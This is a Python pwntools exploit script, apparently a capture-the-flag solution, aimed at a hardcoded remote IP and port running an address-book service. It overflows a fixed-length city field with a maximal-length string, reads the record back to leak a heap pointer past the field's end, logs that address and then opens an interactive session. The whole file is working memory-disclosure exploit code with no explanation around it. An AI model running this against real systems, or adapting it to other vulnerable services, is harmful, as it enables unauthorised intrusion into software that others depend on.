import pwn


HOST, PORT = '125.129.121.42', 55555

p = pwn.remote(HOST, PORT)
pwn.context.log_level = 'DEBUG'
p.newline = b'\r\n'


def menu(i):
    p.recvuntil('> \r\n')
    p.sendline(str(i))


def add_address(name, address, city):
    assert len(name) <= 0x10 and len(address) <= 0x200 and len(city) <= 0x18
    menu(1)

    p.recvuntil('Name :')
    if len(name) == 0x10:
        p.send(name)
    else:
        p.sendline(name)

    p.recvuntil('Address : ')
    if len(address) == 0x200:
        p.send(address)
    else:
        p.sendline(address)

    p.recvuntil('City : ')
    if len(city) == 0x18:
        p.send(city)
    else:
        p.sendline(city)


def list_address(index):
    menu(2)
    p.recvuntil('Enter the number of addresses want to view > ')
    p.sendline('100')

    p.recvuntil(f'======Address [{index}]======\r\n')
    p.recvuntil('Name : ')
    name = p.recvline(keepends=False)
    p.recvuntil('Address : ')
    address = p.recvline(keepends=False)
    p.recvuntil('City : ')
    city = p.recvline(keepends=False)
    return name, address, city


p.recvuntil('Input Address Book Name > \r\n')
p.sendline('ironore15')

add_address('ironore15', 'ironore15', 'Gasselternijveenschemond')
add_address('ironore15', 'ironore15', 'ironore15')

name, address, city = list_address(1)

assert len(city) > 0x18
heap_leak = pwn.u64(city[0x18:0x20].ljust(8, b'\x00'))

pwn.log.info(f'HEAP: {hex(heap_leak)}')

pwn.context.log_level = 'INFO'
p.interactive()
